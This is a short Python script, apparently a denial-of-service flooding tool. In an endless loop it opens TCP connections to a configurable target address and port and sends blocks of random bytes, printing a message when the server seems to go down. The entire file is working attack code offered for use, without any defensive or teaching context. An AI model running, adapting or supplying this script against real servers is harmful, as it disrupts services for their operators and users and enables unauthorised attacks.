import socket
import random

ip = "127.0.0.1"  # Target IP
port = 80

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.sendto(random._urandom(1024), (ip, port))
        print(f"[✓] Sent packet to {ip}:{port}")
        s.close()
    except:
        print("[!] Server may be down")
